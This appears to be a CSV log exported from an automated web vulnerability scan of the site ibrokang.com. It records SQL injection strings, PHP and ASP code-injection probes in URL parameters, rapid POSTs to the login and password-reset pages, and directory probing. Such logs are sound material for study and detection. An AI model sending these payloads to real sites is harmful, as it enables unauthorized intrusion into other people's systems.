Id,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
2971,Tue Aug 31 11:25:13 WAT 2021,Tue Aug 31 11:25:14 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%27+AND+%271%27%3D%271%27+--+,200,OK,948,248,23023
2972,Tue Aug 31 11:25:14 WAT 2021,Tue Aug 31 11:25:14 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%27+AND+%271%27%3D%272%27+--+,200,OK,239,248,23023
2973,Tue Aug 31 11:25:14 WAT 2021,Tue Aug 31 11:25:15 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%27+OR+%271%27%3D%271%27+--+,200,OK,900,248,23023
2974,Tue Aug 31 11:25:15 WAT 2021,Tue Aug 31 11:25:16 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%27+AND+%271%27%3D%272%27+--+,200,OK,1003,248,23023
2975,Tue Aug 31 11:25:16 WAT 2021,Tue Aug 31 11:25:17 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%27+OR+%271%27%3D%271%27+--+,200,OK,487,248,23023
2976,Tue Aug 31 11:25:17 WAT 2021,Tue Aug 31 11:25:17 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on+UNION+ALL+select+NULL+--+,200,OK,652,248,23023
2977,Tue Aug 31 11:25:17 WAT 2021,Tue Aug 31 11:25:18 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%27+UNION+ALL+select+NULL+--+,200,OK,242,248,23023
2978,Tue Aug 31 11:25:18 WAT 2021,Tue Aug 31 11:25:18 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%22+UNION+ALL+select+NULL+--+,200,OK,246,248,23023
2979,Tue Aug 31 11:25:18 WAT 2021,Tue Aug 31 11:25:18 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%29+UNION+ALL+select+NULL+--+,200,OK,235,248,23023
2980,Tue Aug 31 11:25:18 WAT 2021,Tue Aug 31 11:25:18 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%27%29+UNION+ALL+select+NULL+--+,200,OK,241,248,23023
2981,Tue Aug 31 11:25:18 WAT 2021,Tue Aug 31 11:25:19 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on,200,OK,238,248,23023
2982,Tue Aug 31 11:25:13 WAT 2021,Tue Aug 31 11:25:19 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27+AND+%271%27%3D%272%27+--+,200,OK,5800,349,347412
2983,Tue Aug 31 11:25:19 WAT 2021,Tue Aug 31 11:25:22 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27+OR+%271%27%3D%271%27+--+,200,OK,2901,349,347412
2984,Tue Aug 31 11:25:22 WAT 2021,Tue Aug 31 11:25:28 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27+AND+%271%27%3D%272%27+--+,200,OK,6152,349,347412
2985,Tue Aug 31 11:25:28 WAT 2021,Tue Aug 31 11:25:39 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27+OR+%271%27%3D%271%27+--+,200,OK,11180,349,347412
2986,Tue Aug 31 11:25:39 WAT 2021,Tue Aug 31 11:25:42 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1+UNION+ALL+select+NULL+--+,200,OK,2721,349,347412
2987,Tue Aug 31 11:25:42 WAT 2021,Tue Aug 31 11:25:44 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27+UNION+ALL+select+NULL+--+,200,OK,2133,349,347412
2988,Tue Aug 31 11:25:44 WAT 2021,Tue Aug 31 11:25:46 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%22+UNION+ALL+select+NULL+--+,200,OK,1440,349,347412
2989,Tue Aug 31 11:25:46 WAT 2021,Tue Aug 31 11:25:49 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%29+UNION+ALL+select+NULL+--+,200,OK,3034,349,347412
2990,Tue Aug 31 11:25:49 WAT 2021,Tue Aug 31 11:25:52 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27%29+UNION+ALL+select+NULL+--+,200,OK,2773,349,347412
2991,Tue Aug 31 11:25:52 WAT 2021,Tue Aug 31 11:25:54 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1,200,OK,2318,349,347412
2992,Tue Aug 31 11:25:54 WAT 2021,Tue Aug 31 11:25:54 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,200,OK,130,415,9063
2993,Tue Aug 31 11:25:54 WAT 2021,Tue Aug 31 11:25:54 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,134,415,10688
2994,Tue Aug 31 11:25:54 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,200,OK,128,415,9063
2995,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,302,Found,122,391,0
2996,Tue Aug 31 11:25:54 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,246,415,10688
2997,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,302,Found,121,391,0
2998,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,127,415,10580
2999,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,200,OK,118,415,9046
3000,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,131,415,10581
3001,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,200,OK,126,415,9015
3002,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,123,415,10671
3003,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,200,OK,124,415,8994
3004,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,124,415,10640
3005,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,134,415,10619
3006,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:55 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,131,415,10615
3007,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,136,415,10510
3008,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,126,415,10510
3009,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,123,415,10510
3010,Tue Aug 31 11:25:55 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,200,OK,776,415,8990
3011,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,180,415,10510
3012,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,400,Bad Request,118,236,0
3013,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,124,415,10510
3014,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,400,Bad Request,116,236,0
3015,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,124,415,10510
3016,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,400,Bad Request,120,236,0
3017,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:56 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,400,Bad Request,117,236,0
3018,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:57 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,400,Bad Request,117,236,0
3019,Tue Aug 31 11:25:57 WAT 2021,Tue Aug 31 11:25:57 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,400,Bad Request,117,236,0
3020,Tue Aug 31 11:25:57 WAT 2021,Tue Aug 31 11:25:57 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,400,Bad Request,120,236,0
3021,Tue Aug 31 11:25:57 WAT 2021,Tue Aug 31 11:25:57 WAT 2021,POST,https://ibrokang.com/Account/ForgotPassword,400,Bad Request,116,236,0
3022,Tue Aug 31 11:25:57 WAT 2021,Tue Aug 31 11:25:57 WAT 2021,GET,https://ibrokang.com/Account,404,Not Found,121,234,0
3023,Tue Aug 31 11:25:56 WAT 2021,Tue Aug 31 11:25:57 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,1198,415,10510
3024,Tue Aug 31 11:25:57 WAT 2021,Tue Aug 31 11:25:58 WAT 2021,POST,https://ibrokang.com/Account/Login,200,OK,239,415,10510
3025,Tue Aug 31 11:25:58 WAT 2021,Tue Aug 31 11:25:58 WAT 2021,GET,https://ibrokang.com/assets,404,Not Found,121,234,0
3026,Tue Aug 31 11:25:58 WAT 2021,Tue Aug 31 11:25:58 WAT 2021,GET,https://ibrokang.com/assets/css,404,Not Found,119,234,0
3027,Tue Aug 31 11:25:58 WAT 2021,Tue Aug 31 11:25:58 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,383,255,23152
3028,Tue Aug 31 11:25:58 WAT 2021,Tue Aug 31 11:25:58 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,264,255,23152
3029,Tue Aug 31 11:25:58 WAT 2021,Tue Aug 31 11:25:59 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,284,255,23152
3030,Tue Aug 31 11:25:59 WAT 2021,Tue Aug 31 11:25:59 WAT 2021,GET,https://ibrokang.com/assets/demo,404,Not Found,132,234,0
3031,Tue Aug 31 11:25:59 WAT 2021,Tue Aug 31 11:25:59 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,692,255,23152
3032,Tue Aug 31 11:25:59 WAT 2021,Tue Aug 31 11:26:00 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,396,255,23152
3033,Tue Aug 31 11:26:00 WAT 2021,Tue Aug 31 11:26:01 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,1141,255,23152
3034,Tue Aug 31 11:26:01 WAT 2021,Tue Aug 31 11:26:01 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,371,255,23152
3035,Tue Aug 31 11:26:01 WAT 2021,Tue Aug 31 11:26:02 WAT 2021,POST,https://ibrokang.com/Account/Login,500,Internal Server Error,490,255,23152
3036,Tue Aug 31 11:26:02 WAT 2021,Tue Aug 31 11:26:02 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,124,236,0
3037,Tue Aug 31 11:26:02 WAT 2021,Tue Aug 31 11:26:02 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,126,236,0
3038,Tue Aug 31 11:26:02 WAT 2021,Tue Aug 31 11:26:02 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,123,236,0
3039,Tue Aug 31 11:26:02 WAT 2021,Tue Aug 31 11:26:02 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,123,236,0
3040,Tue Aug 31 11:26:02 WAT 2021,Tue Aug 31 11:26:02 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,124,236,0
3041,Tue Aug 31 11:26:02 WAT 2021,Tue Aug 31 11:26:03 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,132,236,0
3042,Tue Aug 31 11:26:03 WAT 2021,Tue Aug 31 11:26:03 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,124,236,0
3043,Tue Aug 31 11:26:03 WAT 2021,Tue Aug 31 11:26:03 WAT 2021,POST,https://ibrokang.com/Account/Login,400,Bad Request,123,236,0
3044,Tue Aug 31 11:25:59 WAT 2021,Tue Aug 31 11:26:03 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22,200,OK,4303,349,347412
3045,Tue Aug 31 11:26:03 WAT 2021,Tue Aug 31 11:26:03 WAT 2021,GET,https://ibrokang.com/assets/images,404,Not Found,124,234,0
3046,Tue Aug 31 11:26:05 WAT 2021,Tue Aug 31 11:26:05 WAT 2021,GET,https://ibrokang.com/assets/img,404,Not Found,125,234,0
3047,Tue Aug 31 11:26:05 WAT 2021,Tue Aug 31 11:26:05 WAT 2021,GET,https://ibrokang.com/assets/js,404,Not Found,126,234,0
3048,Tue Aug 31 11:26:05 WAT 2021,Tue Aug 31 11:26:05 WAT 2021,GET,https://ibrokang.com/assets/js/core,404,Not Found,120,234,0
3049,Tue Aug 31 11:26:06 WAT 2021,Tue Aug 31 11:26:06 WAT 2021,GET,https://ibrokang.com/assets/js/plugins,404,Not Found,124,234,0
3050,Tue Aug 31 11:26:06 WAT 2021,Tue Aug 31 11:26:07 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22,200,OK,676,362,10636
3051,Tue Aug 31 11:26:07 WAT 2021,Tue Aug 31 11:26:07 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,200,OK,241,362,10636
3052,Tue Aug 31 11:26:03 WAT 2021,Tue Aug 31 11:26:08 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,200,OK,5221,349,347412
3053,Tue Aug 31 11:26:07 WAT 2021,Tue Aug 31 11:26:08 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,200,OK,1023,362,10636
3054,Tue Aug 31 11:26:08 WAT 2021,Tue Aug 31 11:26:09 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,200,OK,233,362,10636
3055,Tue Aug 31 11:26:09 WAT 2021,Tue Aug 31 11:26:09 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,200,OK,801,362,10636
3056,Tue Aug 31 11:26:09 WAT 2021,Tue Aug 31 11:26:10 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=%22%2Bresponse.write%28%5B540%2C743*79%2C774%29%2B%22,200,OK,775,362,10636
3057,Tue Aug 31 11:26:10 WAT 2021,Tue Aug 31 11:26:11 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,200,OK,404,362,10636
3058,Tue Aug 31 11:26:11 WAT 2021,Tue Aug 31 11:26:12 WAT 2021,GET,https://ibrokang.com/assets/js/now-ui-dashboard.js?v=response.write%28540%2C743*79%2C774%29,200,OK,1021,362,10636
3059,Tue Aug 31 11:26:08 WAT 2021,Tue Aug 31 11:26:12 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,200,OK,4121,349,347412
3060,Tue Aug 31 11:26:15 WAT 2021,Tue Aug 31 11:26:15 WAT 2021,GET,https://ibrokang.com/assets/plugins,404,Not Found,120,234,0
3061,Tue Aug 31 11:26:15 WAT 2021,Tue Aug 31 11:26:15 WAT 2021,GET,https://ibrokang.com/assets/plugins/bootstrap,404,Not Found,122,234,0
3062,Tue Aug 31 11:26:12 WAT 2021,Tue Aug 31 11:26:16 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,200,OK,3617,349,347412
3063,Tue Aug 31 11:26:16 WAT 2021,Tue Aug 31 11:26:16 WAT 2021,GET,https://ibrokang.com/assets/plugins/owl-carousel,404,Not Found,121,234,0
3064,Tue Aug 31 11:26:17 WAT 2021,Tue Aug 31 11:26:17 WAT 2021,GET,https://ibrokang.com/assets/plugins/themify,404,Not Found,115,234,0
3065,Tue Aug 31 11:26:17 WAT 2021,Tue Aug 31 11:26:17 WAT 2021,GET,https://ibrokang.com/css,404,Not Found,116,234,0
3066,Tue Aug 31 11:26:17 WAT 2021,Tue Aug 31 11:26:18 WAT 2021,GET,https://ibrokang.com/Home,302,Found,120,294,0
3067,Tue Aug 31 11:26:18 WAT 2021,Tue Aug 31 11:26:18 WAT 2021,GET,https://ibrokang.com/js,404,Not Found,121,234,0
3068,Tue Aug 31 11:26:18 WAT 2021,Tue Aug 31 11:26:18 WAT 2021,GET,https://ibrokang.com/js/site.js?v=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22,200,OK,124,359,35
3069,Tue Aug 31 11:26:18 WAT 2021,Tue Aug 31 11:26:18 WAT 2021,GET,https://ibrokang.com/js/site.js?v=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,200,OK,120,359,35
3070,Tue Aug 31 11:26:18 WAT 2021,Tue Aug 31 11:26:18 WAT 2021,GET,https://ibrokang.com/js/site.js?v=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,200,OK,127,359,35
3071,Tue Aug 31 11:26:18 WAT 2021,Tue Aug 31 11:26:19 WAT 2021,GET,https://ibrokang.com/js/site.js?v=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,200,OK,137,359,35
3072,Tue Aug 31 11:26:19 WAT 2021,Tue Aug 31 11:26:19 WAT 2021,GET,https://ibrokang.com/js/site.js?v=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,200,OK,120,359,35
3073,Tue Aug 31 11:26:19 WAT 2021,Tue Aug 31 11:26:19 WAT 2021,GET,https://ibrokang.com/js/site.js?v=%22%2Bresponse.write%28%5B921%2C781*592%2C187%29%2B%22,200,OK,117,359,35
3074,Tue Aug 31 11:26:19 WAT 2021,Tue Aug 31 11:26:19 WAT 2021,GET,https://ibrokang.com/js/site.js?v=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,200,OK,420,359,35
3075,Tue Aug 31 11:26:19 WAT 2021,Tue Aug 31 11:26:19 WAT 2021,GET,https://ibrokang.com/js/site.js?v=response.write%28921%2C781*592%2C187%29,200,OK,121,359,35
3076,Tue Aug 31 11:26:20 WAT 2021,Tue Aug 31 11:26:20 WAT 2021,GET,https://ibrokang.com/Register,200,OK,352,248,23006
3077,Tue Aug 31 11:26:20 WAT 2021,Tue Aug 31 11:26:21 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22,200,OK,1039,248,23006
3078,Tue Aug 31 11:26:21 WAT 2021,Tue Aug 31 11:26:21 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,200,OK,230,248,23006
3079,Tue Aug 31 11:26:21 WAT 2021,Tue Aug 31 11:26:22 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,200,OK,356,248,23006
3080,Tue Aug 31 11:26:22 WAT 2021,Tue Aug 31 11:26:22 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,200,OK,240,248,23006
3081,Tue Aug 31 11:26:22 WAT 2021,Tue Aug 31 11:26:22 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,200,OK,240,248,23006
3082,Tue Aug 31 11:26:22 WAT 2021,Tue Aug 31 11:26:23 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=%22%2Bresponse.write%28%5B722%2C255*578%2C056%29%2B%22,200,OK,763,248,23006
3083,Tue Aug 31 11:26:23 WAT 2021,Tue Aug 31 11:26:24 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,200,OK,815,248,23006
